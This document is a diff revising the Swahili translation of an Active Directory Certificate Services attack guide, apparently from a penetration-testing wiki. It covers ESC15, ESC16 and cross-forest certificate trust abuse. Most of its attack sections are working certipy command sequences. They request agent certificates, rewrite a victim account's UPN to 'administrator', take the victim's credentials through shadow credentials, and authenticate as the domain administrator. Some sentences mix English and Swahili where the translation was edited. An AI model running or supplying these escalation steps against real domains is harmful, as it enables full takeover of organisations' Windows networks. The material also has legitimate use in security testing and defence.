+**Hatua 1: Omba cheti kutoka kwa V1 template (with "Enrollee supplies subject"), ukiingiza "Certificate Request Agent" Application Policy.** Cheti hiki ni kwa ajili ya mshambuliaji (`attacker@corp.local`) kuwa enrollment agent. Hakuna UPN iliyotajwa kwa utambulisho wa mshambuliaji hapa, kwani lengo ni uwezo wa agent.
 ```bash
 certipy req \
 -u 'attacker@corp.local' -p 'Passw0rd!' \
@@ -806,7 +807,7 @@ certipy req \
 ```
 - `-application-policies 'Certificate Request Agent'`: Inaingiza OID `1.3.6.1.4.1.311.20.2.1`.
 
-**Hatua 2: Tumia cheti cha "agent" kuomba cheti kwa niaba ya mtumiaji lengwa mwenye ruhusa za juu.** Hii ni hatua inayofanana na ESC3, ikitumia cheti kutoka Hatua ya 1 kama cheti cha "agent".
+**Hatua ya 2: Tumia cheti cha "agent" kuomba cheti kwa niaba ya mtumiaji mwenye ruhusa za juu anayelengwa.** Hii ni hatua inayofanana na ESC3, ikitumia cheti kutoka Hatua ya 1 kama cheti cha "agent".
 ```bash
 certipy req \
 -u 'attacker@corp.local' -p 'Passw0rd!' \
@@ -818,48 +819,48 @@ certipy req \
 ```bash
 certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
 ```
-## Kiendelezaji cha Usalama Kimezimwa kwenye CA (Globally)-ESC16
+## Security Extension Disabled on CA (Globally)-ESC16
 
-### Maelezo
+### Explanation
 
-**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** inarejea hali ambapo, ikiwa usanidi wa AD CS hautoi kulazimisha kuingizwa kwa kiendelezaji **szOID_NTDS_CA_SECURITY_EXT** katika vyeti vyote, mshambuliaji anaweza kutumia hili kwa:
+**ESC16 (Elevation of Privilege via Missing szOID_NTDS_CA_SECURITY_EXT Extension)** inarejelea hali ambapo, ikiwa usanidi wa AD CS hauhitaji ujumuishaji wa kiendelezo cha **szOID_NTDS_CA_SECURITY_EXT** katika vyeti vyote, mshambuliaji anaweza kuchukua fursa ya hili kwa:
 
 1. Kuomba cheti **bila SID binding**.
 
-2. Kutumia cheti hiki **kwa uthibitisho kama akaunti yoyote**, kama kuiga akaunti yenye ruhusa kubwa (mfano, Domain Administrator).
+2. Kutumia cheti hiki **kwa uthibitisho kama akaunti yoyote**, kama kuiga akaunti yenye ruhusa za juu (mf., Domain Administrator).
 
-Unaweza pia kurejea makala hii ili kujifunza zaidi kuhusu kanuni za kina:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6
+Unaweza pia kurejea makala hii kujifunza zaidi kuhusu kanuni za kina:https://medium.com/@muneebnawaz3849/ad-cs-esc16-misconfiguration-and-exploitation-9264e022a8c6
 
-### Matumizi mabaya
+### Abuse
 
-Ifuatayo inarejea [this link](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally), Bonyeza kuona njia za matumizi za kina.
+Yafuatayo yanarejelea [this link](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc16-security-extension-disabled-on-ca-globally). Bonyeza ili kuona mbinu za matumizi kwa undani.
 
-Ili kubaini kama mazingira ya Active Directory Certificate Services (AD CS) yako hatarini kwa **ESC16**
+Ili kubaini kama mazingira ya Active Directory Certificate Services (AD CS) yanaweza kuwa dhaifu kwa **ESC16**
 ```bash
 certipy find -u 'attacker@corp.local' -p '' -dc-ip 10.0.0.100 -stdout -vulnerable
 ```
-**Hatua 1: Soma UPN ya awali ya akaunti ya mwathirika (Hiari - kwa urejesho).
+**Hatua 1: Soma UPN ya awali ya akaunti ya mwathirika (Hiari - kwa ajili ya urejeshaji).**
 ```bash
 certipy account \
 -u 'attacker@corp.local' -p 'Passw0rd!' \
 -dc-ip '10.0.0.100' -user 'victim' \
 read
 ```
-**Hatua 2: Sasisha UPN ya akaunti ya mwathiri kuwa `sAMAccountName` ya msimamizi lengwa.**
+**Hatua ya 2: Sasisha UPN ya akaunti ya mwathiri ili kuwa `sAMAccountName` ya msimamizi lengwa.**
 ```bash
 certipy account \
 -u 'attacker@corp.local' -p 'Passw0rd!' \
 -dc-ip '10.0.0.100' -upn 'administrator' \
 -user 'victim' update
 ```
-**Hatua 3: (Ikiwa inahitajika) Pata credentials za akaunti ya "victim" (kwa mfano, kupitia Shadow Credentials).**
+**Hatua ya 3: (Ikiwa inahitajika) Pata credentials za akaunti ya "victim" (kwa mfano, kupitia Shadow Credentials).**
 ```shell
 certipy shadow \
 -u 'attacker@corp.local' -p 'Passw0rd!' \
 -dc-ip '10.0.0.100' -account 'victim' \
 auto
 ```
-**Hatua 4: Omba cheti kama mtumiaji "victim" kutoka kwa _any suitable client authentication template_ (e.g., "User") kwenye ESC16-vulnerable CA.** Kwa sababu CA ni dhaifu dhidi ya ESC16, itatoa kwa otomatiki SID security extension kutoka kwenye cheti kilichotolewa, bila kujali mipangilio maalum ya template kwa ugani huu. Set the Kerberos credential cache environment variable (shell command):
+**Hatua ya 4: Omba cheti kama mtumiaji "victim" kutoka _kiolezo chochote kinachofaa cha uthibitishaji wa mteja_ (mfano, "User") kwenye CA iliyoathiriwa na ESC16.** Kwa sababu CA imeathiriwa na ESC16, itaitoa kwa otomatiki SID security extension kutoka kwenye cheti kilichotolewa, bila kuzingatia mipangilio maalum ya kiolezo kwa nyongeza hii. Weka variable ya mazingira ya cache ya vithibitisho vya Kerberos (shell command):
 ```bash
 export KRB5CCNAME=victim.ccache
 ```
@@ -877,24 +878,24 @@ certipy account \
 -dc-ip '10.0.0.100' -upn 'victim@corp.local' \
 -user 'victim' update
 ```
-**Hatua 6: Thibitisha kama msimamizi wa lengo.**
+**Hatua ya 6: Thibitisha kama msimamizi lengwa.**
 ```bash
 certipy auth \
 -dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
 -username 'administrator' -domain 'corp.local'
 ```
-## Kuvuruga Misitu kwa Vyeti Kumeelezwa kwa Sauti Isiyo ya Moja
+## Kufichua Misitu kwa Kutumia Vyeti Kimeelezewa kwa Sauti Isiyoamsha
 
-### Kuvunjwa kwa Trusts za Misitu na CA Zilizoharibiwa
+### Kuvunjwa kwa Trusts za Forest kutokana na CA zilizo compromised
 
-Usanidi wa **cross-forest enrollment** umefanywa kuwa rahisi. **root CA certificate** kutoka resource forest huchapishwa kwa account forests na wasimamizi, na vyeti za **enterprise CA** kutoka resource forest zinaongezwa kwenye `NTAuthCertificates` na AIA containers katika kila account forest. Ili kufafanua, mpangilio huu unamkabidhi **CA katika resource forest udhibiti kamili** juu ya misitu mingine yote ambayo inasimamia PKI. Ikiwa CA hii itavamiwa na wadukuzi, vyeti kwa watumiaji wote katika resource na account forests vinaweza kutengenezwa kwa uongo na wao, na hivyo kuvunja mpaka wa usalama wa forest.
+Usanidi wa **cross-forest enrollment** umefanywa kuwa rahisi. **root CA certificate** kutoka kwa resource forest hutangazwa kwa account forests na wasimamizi, na **enterprise CA** certificates kutoka resource forest zinaongezwa kwenye `NTAuthCertificates` na AIA containers katika kila account forest. Kwa ufafanuzi, mpangilio huu unampa **CA in the resource forest complete control** juu ya misitu mingine yote ambayo inasimamia PKI. Ikiwa CA hii itadukuliwa na wadukuzi, vyeti vya watumiaji wote katika resource na account forests vinaweza **forged by them**, na hivyo kuvunja mpaka wa usalama wa forest.
 
 ### Haki za Enrollment Zilizotolewa kwa Foreign Principals
 
-Katika mazingira ya multi-forest, tahadhari inahitajika kuhusu Enterprise CAs ambazo zinachapisha **certificate templates** ambazo zinawaruhusu **Authenticated Users or foreign principals** (watumiaji/vikundi nje ya forest ambayo Enterprise CA inamilikiwa) haki za **enrollment and edit rights**.\
-Baada ya uthibitisho kupitia trust, **Authenticated Users SID** inaongezwa kwenye token ya mtumiaji na AD. Hivyo, ikiwa domain ina Enterprise CA yenye template inayoruhusu **Authenticated Users enrollment rights**, template inaweza kusajiliwa na mtumiaji kutoka forest tofauti. Vivyo hivyo, ikiwa **enrollment rights zimetolewa wazi kwa foreign principal na template**, basi **cross-forest access-control relationship inaundwa**, ikimruhusu principal kutoka forest moja **kuenroll kwenye template ya forest nyingine**.
+Katika mazingira ya multi-forest, tahadhari inahitajika kuhusu Enterprise CAs ambazo **publish certificate templates** ambazo zinamruhusu **Authenticated Users or foreign principals** (watumiaji/vikundi nje ya forest ambayo Enterprise CA inamiliki) **enrollment and edit rights**.\
+Baada ya authentication kupitia trust, **Authenticated Users SID** inaongezwa kwenye token ya mtumiaji na AD. Hivyo, ikiwa domain ina Enterprise CA yenye template ambayo **allows Authenticated Users enrollment rights**, template inaweza kuweza **be enrolled in by a user from a different forest**. Vivyo hivyo, ikiwa **enrollment rights are explicitly granted to a foreign principal by a template**, **cross-forest access-control relationship is thereby created**, ikiruhusu principal kutoka forest moja **enroll in a template from another forest**.
 
-Matukio yote mawili huongeza **attack surface** kutoka forest moja hadi nyingine. Mipangilio ya certificate template inaweza kutumiwa na mwadui kupata vibali zaidi katika domain ya kigeni.
+Matukio yote mawili huleta **increase in the attack surface** kutoka forest moja hadi nyingine. Mipangilio ya certificate template inaweza kutumiwa na mwashambulizi kupata ruhusa za ziada katika domain ya kigeni.
 
 
 ## References
